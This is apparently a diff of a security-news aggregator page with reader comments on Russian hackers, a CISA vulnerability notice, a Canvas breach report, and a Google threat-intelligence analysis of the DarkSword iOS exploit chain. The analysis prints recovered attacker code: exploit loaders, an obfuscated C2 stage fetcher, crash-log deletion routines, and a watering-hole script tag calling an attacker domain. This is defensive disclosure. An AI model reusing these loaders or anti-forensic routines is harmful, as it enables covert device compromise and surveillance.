 I’ve not recently deep-read Apple’s EULA but I’d think *being a criminal* is in there somehow…
+lol
 Hats off, GENTLEMEN, to Brian Krebs!
 It’s funny. When I start reading it, I thought to myself, “Russian?” And sure enough. It is.
 I think the reason it’s so easy to track there people down (aside from the Russian government letting them do it as long as the victims are in the West and that’s why they don’t care about hiding) is because most of those “hackers” are just plain stupid low lives. Otherwise anyone that had two brain cells had already left that nasty country.
@@ -619,6 +514,7 @@ There is
 The company ended up dismantling the Moscow office and relocating the staff, on company expenses, to Central Europe.
 A bank that I worked for tried to expand to Russia. It backed off after a few years – the corruption was unmanageable.
 Russia has great nature, great culture, and the people are friendly and welcoming. But as a place to live – no, it is not pleasant at all.
+I think it most definitely matters where in Russia (or let’s be honest, here, what country near Russia) you are taking about. I think it is dangerous to confuse “low corruption” with “a different sort of corruption”, also. It is shocking how many ignorant people think Ukraine is or was less corrupt, for instance, or really, most any country in Central or Eastern Europe. Might make more sense to judge corruption by whether you wind up getting what you paid for (be it in money, favour, or just looking the other way). Some “corrupt” places, you get treated more fairly than some places people deem ‘fair’. Better a mechanism to work around corruption and bias, to some people, than no recompense or recourse. It might cost, but better that than no alternative.
 “Nasty country” – pray tell where you’ve found so entirely free of nastiness to live, Mr. Menace?
 Might as well be living on the sun.
 He’s got an umbrella and time to kill. It’s a dry heat.
@@ -657,7 +553,21 @@ Great breakdown on threat actor attribution. Security research like this is esse
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-9" class="article-body">
+        <div id="art-7" class="article-body">
+            <h2 class="article-title">CISA Adds Three Known Exploited Vulnerabilities to Catalog</h2>
+            <p class="source-link">Source: All CISA Advisories | <a href="https://www.cisa.gov/news-events/alerts/2026/06/09/cisa-adds-three-known-exploited-vulnerabilities-catalog" target="_blank">Original Link</a></p>
+            <div class="content-text">CISA Adds Three Known Exploited Vulnerabilities to Catalog
+CISA has added three new vulnerabilities to its [Known Exploited Vulnerabilities (KEV) Catalog](/known-exploited-vulnerabilities-catalog), based on evidence of active exploitation.
+[CVE-2026-7473](https://www.cve.org/CVERecord?id=CVE-2026-7473)Arista Extensible Operating System Incomplete Comparison with Missing Factors Vulnerability[CVE-2026-11645](https://www.cve.org/CVERecord?id=CVE-2026-11645)Google Chromium V8 Out-of-Bounds Read and Write Vulnerability[CVE-2026-20245](https://www.cve.org/CVERecord?id=CVE-2026-20245)Cisco Catalyst SD-WAN Manager Improper Encoding or Escaping of Output Vulnerability
+These types of vulnerabilities are a frequent attack vector for malicious cyber actors and pose significant risks to the federal enterprise.
+[Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities](/binding-operational-directive-22-01) established the KEV Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the [BOD 22-01 Fact Sheet](/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf) for more information.
+Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of [KEV Catalog vulnerabilities](/known-exploited-vulnerabilities-catalog) as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the [specified criteria](/known-exploited-vulnerabilities).
+This product is provided subject to this [Notification](/notification) and this [Privacy & Use](/privacy-policy) policy.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-8" class="article-body">
             <h2 class="article-title">Canvas Breach Disrupts Schools & Colleges Nationwide</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/05/canvas-breach-disrupts-schools-colleges-nationwide/" target="_blank">Original Link</a></p>
             <div class="content-text">An ongoing data extortion attack targeting the widely-used education technology platform Canvas disrupted classes and coursework at school districts and universities across the United States today, after a cybercrime group defaced the service’s login page with a ransom demand that threatened to leak data from 275 million students and faculty across nearly 9,000 educational institutions.
@@ -802,6 +712,521 @@ Not a very accurate AI summary.
 If I were Instructure I would require every student to get a new unique identifier number.
 Must have sucked to take your AP tests those two weeks.
 A funny side note. I heard that there were students reaching out to the hackers. They wanted to pay the hackers to change their scores 🙂 I heard through reliable source but could have been a fabrication. I wouldnt be surprised at all though and i believe it.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-9" class="article-body">
+            <h2 class="article-title">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors</h2>
+            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain/" target="_blank">Original Link</a></p>
+            <div class="content-text">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors
+Google Threat Intelligence Group
+Google Threat Intelligence
+Visibility and context on the threats that matter most.
+[Contact Us & Get a Demo](https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&utm_medium=blog&utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest)
+Introduction
+Google Threat Intelligence Group (GTIG) has identified a new iOS full-chain exploit that leveraged multiple zero-day vulnerabilities to fully compromise devices. Based on toolmarks in recovered payloads, we believe the exploit chain to be called DarkSword. Since at least November 2025, GTIG has observed multiple commercial surveillance vendors and suspected state-sponsored actors utilizing DarkSword in distinct campaigns. These threat actors have deployed the exploit chain against targets in Saudi Arabia, Turkey, Malaysia, and Ukraine.
+DarkSword supports iOS versions 18.4 through 18.7 and utilizes six different vulnerabilities to deploy final-stage payloads. GTIG has identified three distinct malware families deployed following a successful DarkSword compromise: GHOSTBLADE, GHOSTKNIFE, and GHOSTSABER. The proliferation of this single exploit chain across disparate threat actors mirrors the previously discovered [Coruna iOS exploit kit](https://cloud.google.com/blog/topics/threat-intelligence/coruna-powerful-ios-exploit-kit). Notably, UNC6353, a suspected Russian espionage group previously observed using Coruna, has recently incorporated DarkSword into their watering hole campaigns.
+In this blog post, we examine the uses of DarkSword by these distinct threat actors, provide an analysis of their final-stage payloads, and describe the vulnerabilities leveraged by DarkSword. GTIG reported the vulnerabilities used in DarkSword to Apple in late 2025, and all vulnerabilities were patched with the release of iOS 26.3 (although most were patched prior). We have added domains involved in DarkSword delivery to [Safe Browsing](https://safebrowsing.google.com/), and strongly urge users to update their devices to the latest version of iOS. In instances where an update is not possible, it is recommended that [Lockdown Mode](https://support.apple.com/en-us/105120) be enabled for enhanced security.
+This research is published in coordination with our industry partners at [Lookout](https://www.lookout.com/blog/darksword) and [iVerify](https://iverify.io/blog/darksword-ios-exploit-kit-explained).
+Discovery Timeline
+GTIG has identified several different users of the DarkSword exploit chain dating back to November 2025. In addition to the case studies on DarkSword usage documented in this blog post, we assess it is likely that other commercial surveillance vendors or threat actors may also be using DarkSword.
+Figure 1: Timeline of DarkSword observations and vulnerability patches
+Saudi Arabian Users Targeted via Snapchat-Themed Website (UNC6748)
+In early November 2025, GTIG identified the threat cluster UNC6748 leveraging a Snapchat-themed website, snapshare[.]chat
+, to target Saudi Arabian users (Figure 2). The landing page on the website included JavaScript code using a mix of obfuscation techniques, and created a new IFrame that pulled in another resource at frame.html
+(Figure 3). The landing page JavaScript also set a session storage key named uid
+, and checked if that key was already set prior to creating the IFrame that fetches the next delivery stage. We assess this is to prevent re-infecting prior victims. In subsequent observations of UNC6748 throughout November 2025, we observed them update the landing page to include anti-debugging and additional obfuscation to hinder analysis. We also identified additional code added when the actor attempts to infect a user using Chrome, where the x-safari-https
+protocol handler is used to open the page in Safari (Figure 4). This suggests that UNC6748 didn't have an exploit chain for Chrome at the time of this activity. During the infection process, the victim is redirected to a legitimate Snapchat website in an attempt to masquerade the activity.
+frame.html
+is a simple HTML file that dynamically injects a new script
+tag that loads in the main exploit loader, rce_loader.js
+(Figure 5). The loader performs some initialization used by subsequent stages, and fetches a remote code execution (RCE) exploit from the server using XMLHttpRequest
+(Figure 6).
+We observed UNC6748 activity multiple times throughout November 2025, where both major and minor updates were made to their infection process:
+-
+The first UNC6748 activity we observed only had support for one RCE exploit split across two files,
+rce_module.js
+andrce_worker_18.4.js
+(Figure 7). This exploit primarily leveraged CVE-2025-31277, a memory corruption vulnerability in JavaScriptCore (the JavaScript engine used in WebKit and Apple Safari), and also CVE-2026-20700, a Pointer Authentication Codes (PAC) bypass indyld
+. -
+We then identified activity several days later where another RCE exploit was added,
+rce_worker_18.6.js
+(Figure 8). This exploit used CVE-2025-43529, a different memory corruption vulnerability in JavaScriptCore, alongside the same CVE-2026-20700 exploit in the same file. -
+The loader was modified to also fetch a
+rce_module_18.6.js
+payload, which only defined a simple function that was not observed in use elsewhere. -
+However, the logic implemented for this did not correctly serve the iOS 18.4 exploit if the device version wasn't 18.6, and did not account for the existence of iOS 18.7, even though it was released two months prior in September 2025. This suggests that this update may have been originally written months prior to UNC6748 acquiring and/or deploying it.
+-
+Later in November 2025, we observed another module added,
+rce_worker_18.7.js
+(Figure 9). This was an updated version ofrce_worker_18.6.js
+, but with offsets added to support iOS 18.7. -
+There was also a logic flaw in the loader in this case, as it loaded the exploit for iOS 18.7 regardless of the detected device version.
+In our observations, UNC6748 used the same modules for sandbox escapes and privilege escalation, along with the same final payload, GHOSTKNIFE.
+Figure 2: snapshare[.]chat decoy page
+if (!sessionStorage.getItem("uid") && isTouchScreen) {
+sessionStorage.setItem("uid", '1');
+const frame = document.createElement("iframe");
+frame.src = "frame.html?" + Math.random();
+frame.style.height = 0;
+frame.style.width = 0;
+frame.style.border = "none";
+document.body.appendChild(frame);
+} else {
+top.location.href = "red";
+}
+Figure 3: Landing page snippet that loads frame.html
+(UNC6748, November 2025)
+<!DOCTYPE html>
+<html>
+<head>
+<title></title>
+</head>
+<body>
+<script type="text/javascript">document.write('<script defer=\"defer\" src=\"rce_loader.js\"\>\<\/script\>');</script>
+</body>
+</html>
+Figure 4: frame.html
+contents (UNC6748, November 2025)
+if (typeof browser !== "undefined" || !isIphone()) {
+console.log("");
+} else {
+location.href = "x-safari-https://snapshare.chat/<redacted>";
+}
+Figure 5: Landing page code snippet showing x-safari-https
+use (UNC6748, November 2025)
+function getJS(fname,method = 'GET')
+{
+try
+{
+url = fname;
+print(`trying to fetch ${method} from: ${url}`);
+let xhr = new XMLHttpRequest();
+xhr.open("GET", `${url}` , false);
+xhr.send(null);
+return xhr.responseText;
+}
+catch(e)
+{
+print("got error in getJS: " + e);
+}
+}
+Figure 6: rce_loader.js
+snippet showing the logic for fetching additional stages (UNC6748, November 2025)
+let workerCode = "";
+workerCode = getJS(`rce_worker_18.4.js`); // local version
+let workerBlob = new Blob([workerCode],{type:'text/javascript'});
+let workerBlobUrl = URL.createObjectURL(workerBlob);
+Figure 7: rce_loader.js
+snippet showing a single RCE exploit worker being loaded (UNC6748, November 2025)
+let workerCode = "";
+if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
+workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`); // local version
+else
+workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`); // local version
+let workerBlob = new Blob([workerCode],{type:'text/javascript'});
+let workerBlobUrl = URL.createObjectURL(workerBlob);
+Figure 8: rce_loader.js
+snippet showing (attempted) support for different RCE exploit workers (UNC6748, November 2025)
+let workerCode = "";
+if(ios_version == '18,7')
+workerCode = getJS(`rce_worker_18.7.js?${Date.now()}`); // local version
+else
+workerCode = getJS(`rce_worker_18.7.js?${Date.now()}`); // local version
+let workerBlob = new Blob([workerCode],{type:'text/javascript'});
+let workerBlobUrl = URL.createObjectURL(workerBlob);
+Figure 9: rce_loader.js
+snippet with iOS 18.7 support added (UNC6748, November 2025)
+GHOSTKNIFE
+In this activity, we observed UNC6748 deploy a backdoor GTIG tracks as GHOSTKNIFE. GHOSTKNIFE, written in JavaScript, has several modules for exfiltrating different types of data, including signed-in accounts, messages, browser data, location history, and recordings. It also supports downloading files from the C2 server, taking screenshots, and recording audio from the device's microphone. GHOSTKNIFE communicates with its C2 server using a custom binary protocol over HTTP, encrypted using a scheme based on ECDH and AES. GHOSTKNIFE can update its config with new parameters from its C2 server.
+GHOSTKNIFE writes files to disk during its execution under /tmp/<uuid>.<numbers>
+, where uuid
+is a randomly generated UUIDv4 value and numbers
+is a hard-coded sequence of several digits. Under that directory, it creates multiple subfolders including STORAGE
+, DATA
+, and TMP
+. As each module of GHOSTKNIFE executes, it writes its data to /tmp/<uuid>.<numbers>/STORAGE/<uuid2>.<id>
+, where id
+is the numeric value of the module and uuid2
+is a different randomly generated UUIDv4 value. Additionally, GHOSTKNIFE periodically erases crash logs from the device to cover its tracks in case of unexpected failures (Figure 10).
+cleanLogs(){
+let files = MyHelper.getContentsOfDir("/var/mobile/Library/Logs/CrashReporter/");
+for(let file of files){//.ips // mediaplaybackd-" panic-full-
+if(file.includes("mediaplaybackd") || file.includes("SpringBoard") || file.includes("com.apple.WebKit.") || file.includes("panic-full-") ){
+MyHelper.deleteFileAtPath(file);
+}
+}
+}
+Figure 10: GHOSTKNIFE snippet responsible for deleting crash logs
+Campaigns Targeting Users in Turkey and Malaysia (PARS Defense)
+In late November 2025, GTIG observed activity associated with the Turkish commercial surveillance vendor PARS Defense where DarkSword was used in Turkey, with support for iOS 18.4-18.7. Unlike the UNC6748 activity, this campaign was carried out with more attention to OPSEC, with obfuscation applied to the exploit loader and some of the exploit stages, and the use of ECDH and AES to encrypt exploits between the server and the victim (Figure 11). Additionally, the obfuscated version of rce_loader.js
+used by PARS Defense fetched the correct RCE exploit depending on the detected iOS version (Figure 12).
+Subsequently, in January 2026, GTIG observed additional activity in Malaysia associated with a different PARS Defense customer. In this case, we were able to collect a different loader used in the activity, which contains additional device fingerprinting logic, and also used the uid
+session storage check. This loader also uses the top.location.href
+redirect for targets that do not pass all of the checks like UNC6748 did, but also sets window.location.href
+to the same URL (Figure 13).
+Where available, GTIG identified a different final payload used in this activity, a backdoor we track as GHOSTSABER.
+function getJS(_0x12fba8) {
+const _0x35744f = generateKeyPair();
+const _0x4a6eb4 = exportPublicKeyAsPem(_0x35744f.publicKey);
+const _0x1bc168 = self.btoa(_0x4a6eb4);
+const _0x119092 = {
+'a': _0x1bc168
+};
+_0x12fba8 = _0x12fba8.startsWith('/') ? _0x12fba8 : '/' + _0x12fba8;
+const _0x1fedd2 = new XMLHttpRequest();
+_0x1fedd2.open('POST', 'https://<redacted>' + (_0x12fba8 + '?' + Date.now()), false);
+_0x1fedd2.setRequestHeader('Content-Type', 'application/json');
+_0x1fedd2.send(JSON.stringify(_0x119092));
+if (_0x1fedd2.status === 0xc8) {
+const _0x362968 = JSON.parse(_0x1fedd2.responseText);
+const _0x32efb2 = _0x362968.a;
+const _0x46ca4b = _0x362968.b;
+const _0xfae3b8 = b64toUint8Array(_0x32efb2);
+const _0x2f4536 = b64toUint8Array(_0x46ca4b);
+const _0xa36b4f = deriveAesKey(_0x35744f.privateKey, _0x2f4536);
+const _0x36e338 = decryptData(_0xfae3b8, _0xa36b4f);
+const _0x50186a = new TextDecoder().decode(_0x36e338);
+return _0x50186a;
+}
+return null;
+}
+Figure 11: Deobfuscated getJS()
+snippet from the DarkSword loader (PARS Defense, November 2025)
+let workerCode = '';
+if (ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2' || ios_version == '18,7') {
+workerCode = getJS('6cde159c.js?' + Date.now());
+} else {
+workerCode = getJS('a9bc5c66.js?' + Date.now());
+}
+let workerBlob = new Blob([workerCode], {
+'type': 'text/javascript'
+});
+let workerBlobUrl = URL.createObjectURL(workerBlob);
+Figure 12: Deobfuscated snippet for loading the RCE workers (PARS Defense, November 2025)
+if (!sessionStorage.getItem('uid') && canUseApplePay() && "standalone" in navigator && (CSS.supports("backdrop-filter: blur(10px)") || CSS.supports("-webkit-backdrop-filter: blur(10px)")) && document.pictureInPictureEnabled && !(typeof window.chrome === "object" && window.chrome !== null) && !('InstallTrigger' in window) && supportsWebGL2() && getDeviceInputInfo() && !("vibrate" in navigator) && debuggerCheck()) {
+(() => {
+function _0x45e723(_0x52731a) {
+const _0x43f8d9 = generateKeyPair();
+const _0x427066 = exportPublicKeyAsPem(_0x43f8d9.publicKey);
+const _0x5cfee7 = self.btoa(_0x427066);
+const _0x96910f = {
+'a': _0x5cfee7
+};
+_0x52731a = _0x52731a.startsWith('/') ? _0x52731a : '/' + _0x52731a;
+const _0x436cc4 = new XMLHttpRequest();
+_0x436cc4.open("POST", 'https://<redacted>' + (_0x52731a + '?' + Date.now()), false);
+_0x436cc4.setRequestHeader('Content-Type', "application/json");
+_0x436cc4.send(JSON.stringify(_0x96910f));
+if (_0x436cc4.status === 0xc8) {
+const _0x4a4193 = JSON.parse(_0x436cc4.responseText);
+const _0x362b30 = _0x4a4193.a;
+const _0x536004 = _0x4a4193.b;
+const _0x183b3f = b64toUint8Array(_0x362b30);
+const _0x46bbee = b64toUint8Array(_0x536004);
+const _0x43e600 = deriveAesKey(_0x43f8d9.privateKey, _0x46bbee);
+const _0x2e0735 = decryptData(_0x183b3f, _0x43e600);
+const _0x26a8b1 = new TextDecoder().decode(_0x2e0735);
+return _0x26a8b1;
+}
+return null;
+}
+let _0x100ce6 = _0x45e723('6297d177.html?' + Math.random());
+const _0x5f5a7d = document.createElement("iframe");
+_0x5f5a7d.srcdoc = _0x100ce6;
+_0x5f5a7d.style.height = 0x0;
+_0x5f5a7d.style.width = 0x0;
+_0x5f5a7d.style.border = 'none';
+document.body.appendChild(_0x5f5a7d);
+})();
+} else {
+top.location.href = "<legit website>";
+window.location.href = '<legit website>';
+}
+Figure 13: Deobfuscated landing page snippet to fetch the DarkSword loader (PARS Defense, January 2026)
+GHOSTSABER
+GHOSTSABER is a JavaScript backdoor used by PARS Defense that communicates with its C2 server over HTTP(S). Its capabilities include device and account enumeration, file listing, data exfiltration, and the execution of arbitrary JavaScript code; a complete list of its supported commands is detailed in Table 1. Observed GHOSTSABER samples contain references to several commands that lack the necessary code to be executed, including some that purport to record audio from the device's microphone and send the device's current geolocation to the C2 server. These commands use a function called send_command_to_upper_process
+, which writes to a shared memory region that is otherwise unused in the implant. We suspect that a follow-on binary module may be downloaded from the C2 server to implement these commands at runtime.
+New Ukrainian Watering Hole Activity From UNC6353
+GTIG observed the suspected Russian espionage actor UNC6353 leveraging DarkSword in a new watering hole campaign targeting Ukrainian users. As mentioned in our recent [blog post](https://cloud.google.com/blog/topics/threat-intelligence/coruna-powerful-ios-exploit-kit), we first began tracking UNC6353 in summer 2025 as a threat cluster conducting watering hole attacks on Ukrainian websites to deliver Coruna. This new activity, which has been active through March 2026 but dates back to at least December 2025, leverages the DarkSword exploit chain to deploy GHOSTBLADE. GTIG notified and collaborated with CERT-UA to mitigate this activity.
+Compromised Ukrainian websites were updated to include a malicious script
+tag that fetched the first delivery stage from an UNC6353 server, static.cdncounter[.]net
+(Figure 14). This script (Figure 15) dynamically creates a new IFrame and sets its source to a file called index.html
+on the same server (Figure 16). While index.html
+bears some overlap with the landing page logic used by UNC6748 and PARS Defense, it sets the uid
+session storage key without checking the session's current state, and includes a Russian language comment that translates to "if uid is still needed, just install it."
+Notably, the observed UNC6353 use of DarkSword only supported iOS 18.4-18.6. While earlier DarkSword use attributed to UNC6748 and PARS Defense also supported iOS 18.7, we did not observe that from UNC6353, despite their later operational timeline. However, the loader used in this version correctly loaded the RCE modules corresponding to the running iOS version, which we didn't observe in UNC6748's use of DarkSword with only iOS 18.4-18.6 support (Figure 17).
+<script async src="https://static.cdncounter.net/widgets.js?uhfiu27fajf2948fjfefaa42"></script>
+Figure 14: Malicious script
+tag used by UNC6353 (March 2026)
+(function () {
+const iframe = document.createElement("iframe");
+iframe.src = "https://static.cdncounter.net/assets/index.html";
+iframe.style.width = "1px";
+iframe.style.height = "1px";
+iframe.style.border = "0";
+iframe.style.position = "absolute";
+iframe.style.left = "-9999px";
+iframe.style.opacity = "0.01";
+// важно для Safari
+iframe.setAttribute(
+"sandbox",
+"allow-scripts allow-same-origin"
+);
+document.body.appendChild(iframe);
+})();
+Figure 15: widgets.js
+(UNC6353, March 2026)
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Test Page</title>
+</head>
+<body>
+<script>
+// если uid всё ещё нужен — просто устанавливаем
+sessionStorage.setItem('uid', '1');
+const frame = document.createElement('iframe');
+frame.src = 'frame.html?' + Math.random();
+frame.style.width = '1px';
+frame.style.opacity = '0.01'
+frame.style.position = 'absolute';
+frame.style.left = '-9999px';
+frame.style.height = '1px';
+frame.style.border = 'none';
+document.body.appendChild(frame);
+</script>
+</body>
+</html>
+Figure 16: index.html
+(UNC6353, March 2026)
+let workerCode = "";
+if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
+workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`); // local version
+else
+workerCode = getJS(`rce_worker_18.4.js?${Date.now()}`); // local version
+let workerBlob = new Blob([workerCode],{type:'text/javascript'});
+let workerBlobUrl = URL.createObjectURL(workerBlob);
+Figure 17: rce_loader.js
+snippet for loading the RCE exploit workers (UNC6353, March 2026)
+GHOSTBLADE
+Following device infections from these watering holes, UNC6353 deployed a malware family GTIG tracks as GHOSTBLADE. GHOSTBLADE is a dataminer written in JavaScript that collects and exfiltrates a wide variety of data from a compromised device (Table 2). Data collected by GHOSTBLADE is exfiltrated to an attacker-controlled server over HTTP(S). Unlike GHOSTKNIFE and GHOSTSABER, GHOSTBLADE is less capable and does not support any additional modules or backdoor-like functionality; it also does not operate continuously. However, similar to GHOSTKNIFE, GHOSTBLADE also contains code to delete crash reports, but targets a different directory where they may be stored (Figure 18). The GHOSTBLADE sample observed in this activity had full debug logging present along with lots of comments in the code.
+Notably, the GHOSTBLADE sample analyzed by GTIG contains a comment and code block conditionally executing code on iOS versions greater than or equal to 18.4, which is the minimum supported version by DarkSword (Figure 19; note that ver
+is parsed from uname
+, which returns the XNU version). This suggests the payload also supports running on versions lower than 18.4, which isn't supported by DarkSword.
+static deleteCrashReports()
+{
+this.getTokenForPath("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/",true);
+libs_JSUtils_FileUtils__WEBPACK_IMPORTED_MODULE_0__["default"].deleteDir("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/",true);
+}
+Figure 18: GHOSTBLADE code snippet used for deleting crash logs
+// If iOS >= 18.4 we apply migbypass in order to bypass autobox restrictions
+if (ver.major == 24 && ver.minor >= 4) {
+mutexPtr = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("malloc", 0x100));
+libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("pthread_mutex_init", mutexPtr, null);
+migFilterBypass = new MigFilterBypass(mutexPtr);
+}
+Figure 19: Code conditionally executed on iOS 18.4+ in GHOSTBLADE
+DarkSword Exploit Chain
+As mentioned, DarkSword uses six different vulnerabilities to fully compromise a vulnerable iOS device and run a final payload with full kernel privileges (Table 3). Unlike Coruna, DarkSword only supports a limited set of iOS versions (18.4-18.7), and while the different exploit stages are technically sophisticated, the mechanisms used for loading the exploits were more basic and less robust than Coruna.
+Also unlike Coruna, DarkSword uses pure JavaScript for all stages of the exploit chain and final payloads. While more sophistication is required to bridge between JavaScript and the native APIs and IPC channels used in the exploit, its use eliminates the need to identify vulnerabilities for bypassing [Page Protection Layer (PPL)](https://support.apple.com/guide/security/operating-system-integrity-sec8b776536b/1/web/1#sec314c3af61) or [Secure Page Table Monitor (SPTM)](https://support.apple.com/guide/security/operating-system-integrity-sec8b776536b/1/web/1#secd022396fb) exploit mitigations in iOS that prevent unsigned binary code from being executed.
+Figure 20: DarkSword infection chain
+Exploit Delivery
+There are notable similarities and differences between the exploit delivery implementations used by UNC6748, PARS Defense, and UNC6353. We assess that each of the actors built their delivery mechanisms on a base set of logic from the DarkSword developers, and made tweaks to fit their own needs. All three actors had some usage of the uid
+session storage key, but not all in the same way:
+-
+We consistently saw UNC6748 landing pages both set the
+uid
+key, and check it before fetching the exploit loader. -
+UNC6748 only set the
+top.location.href
+property to redirect users if they weren't to be infected. -
+PARS Defense used the
+uid
+key in the same way in January 2026, but the initial activity we saw in November 2025 didn't include it. -
+Like UNC6748, PARS Defense set
+top.location.href
+, but also setwindow.location.href
+to the same value. -
+UNC6353 set the
+uid
+key, but did not check it before fetching the exploit loader; a comment in the source code suggests that they did not know if it was required by the subsequent stages.
+Based on the actors' differing usages, we assess that this session storage check logic, along with the subsequent logic using frame.html
+to then fetch rce_loader.js
+as observed from UNC6748 and UNC6353, was developed by the DarkSword exploit chain developers. We assess that the additional fingerprinting logic used by PARS Defense in January 2026 and the anti-debug logic used by UNC6748 in November 2025 were likely written by those users to better meet their operational requirements.
+Loader
+All the activity we observed used effectively the same exploit loader, with some minor differences such as PARS Defense's addition of encryption. The loader manages Web Worker objects that are used by the two RCE exploits, along with state transitions throughout the RCE exploit lifecycle. The loader fetches two files for the RCE stages, named variations of rce_module.js
+and rce_worker.js
+(e.g. rce_worker_18.4.js
+). The iOS 18.4 exploit splits the logic between the Web Worker script and the main module, which is eval
+'d in the same context as the loader; the two different contexts communicate using postMessage
+as the RCE exploit progresses. The iOS 18.6/18.7 RCE exploit, however, contains all of the exploit logic in the worker, and the corresponding rce_module.js
+file just has an unused placeholder function (Figure 21).
+The inconsistencies surrounding the correctness of fetching the RCE stages by the loader module are intriguing. One possibility is that the errors were manually corrected by UNC6353 and PARS Defense; alternatively, it is possible that UNC6748 received the exploit chain updates prior to the other users, and the DarkSword developers subsequently fixed those bugs.
+// for displaying hex value
+function dummyy(x) {
+return '0x' + x.toString(16);
+}
+Figure 21: rce_module_18.7.js
+contents (UNC6748, November 2025)
+Remote Code Execution Exploits
+GTIG observed two different JavaScriptCore (the JavaScript engine used in WebKit and Apple's Safari browser) vulnerabilities exploited for remote code execution by DarkSword. For devices running versions of iOS prior to 18.6, DarkSword uses CVE-2025-31277, a JIT optimization/type confusion bug which was patched by Apple in iOS 18.6. For devices running iOS 18.6-18.7, DarkSword uses CVE-2025-43529, a garbage collection bug in the Data Flow Graph (DFG) JIT layer of JavaScriptCore which was patched by Apple in iOS 18.7.3 and 26.2 after it was reported by GTIG. Both exploits develop their own fakeobj
+/addrof
+primitives, and then build arbitrary read/write primitives the same way on top of them.
+Both vulnerabilities were directly chained with CVE-2026-20700, a bug in dyld
+used as a user-mode [Pointer Authentication Codes (PAC)](https://support.apple.com/guide/security/operating-system-integrity-sec8b776536b/1/web/1#sec0167b469d) bypass to execute arbitrary code, as required by the subsequent exploit stages. This vulnerability was patched by Apple in iOS 26.3 after being reported by GTIG.
+Sandbox Escape Exploits
+Safari is designed to use multiple sandbox layers to isolate the different components of the browser where untrusted user input may be handled. DarkSword uses two separate sandbox escape vulnerabilities, first by pivoting out of the WebContent sandbox into the GPU process, and then by pivoting from the GPU process to mediaplaybackd
+. The same sandbox escape exploits were used regardless of which RCE exploit was needed.
+WebContent Sandbox Escape
+As previously discussed by [Project Zero](https://projectzero.google/2023/10/an-analysis-of-an-in-the-wild-ios-safari-sandbox-escape.html) and others, Safari's renderer process (known as WebContent) is tightly sandboxed to limit the blast radius of any vulnerabilities it may contain, since it is the most accessible to untrusted user content. To bypass this, DarkSword fetches an exploit called sbox0_main_18.4.js
+or sbx0_main.js
+to break out of the WebContent sandbox. This exploit leverages CVE-2025-14174, a vulnerability in ANGLE where parameters were not sufficiently validated in a specific WebGL operation, leading to out-of-bounds memory operations in Safari's GPU process which the DarkSword developers use to execute arbitrary code within the GPU process.
+This vulnerability was reported to Google (the developers of ANGLE) by Apple and GTIG, and was patched in Safari with the release of iOS 18.7.3 and 26.2.
+GPU Sandbox Escape
+In Safari, the GPU process has more privileges than the WebContent sandbox, but still is restricted from accessing much of the rest of the system. To bypass this limitation, DarkSword uses another sandbox escape exploit, sbx1_main.js
+, which leverages CVE-2025-43510, a memory management vulnerability in XNU. This is a copy-on-write bug which is exploited to build arbitrary function call primitives in mediaplaybackd
+, a system service with a larger set of permissions than the Safari GPU process where they can run the final exploit needed. They do this by loading a copy of the JavaScriptCore runtime into the mediaplaybackd
+process, and executing the next stage exploit within it.
+This vulnerability was patched by Apple in iOS 18.7.2 and 26.1.
+Local Privilege Escalation and Final Payload
+Finally, the exploit loaded one last module, pe_main.js
+. This uses CVE-2025-43520, a kernel-mode race condition in XNU's virtual filesystem (VFS) implementation, which can be exploited to build physical and virtual memory read/write primitives. This vulnerability was patched by Apple in iOS 18.7.2 and 26.1.
+The exploit contains a suite of library classes building on top of their primitives that are used by the different post-exploitation payloads, such as Native
+, which provides abstractions for manipulating raw memory and calling native functions, and FileUtils
+, which provides a POSIX-like filesystem API. Artifacts left behind from the Webpack process applied to the analyzed GHOSTBLADE sample included file paths that show the structure on disk of these libraries (Figure 22).
+We assess that GHOSTBLADE was likely developed by the DarkSword developers, based on the consistency in coding styles and the tight integration between it and the library code, which is notably distinct from how GHOSTKNIFE and GHOSTSABER leveraged these libraries. We also observed additional modifications made to some of the post-exploitation payload libraries in the samples observed from PARS Defense, including additional raw memory buffer manipulation, likely used in follow-on binary modules. Additionally, the libraries in GHOSTBLADE contained a reference to a function called startSandworm()
+which was not implemented within it; we suspect this may be a codename for a different exploit.
+src/InjectJS.js
+src/libs/Chain/Chain.js
+src/libs/Chain/Native.js
+src/libs/Chain/OffsetsStruct.js
+src/libs/Driver/Driver.js
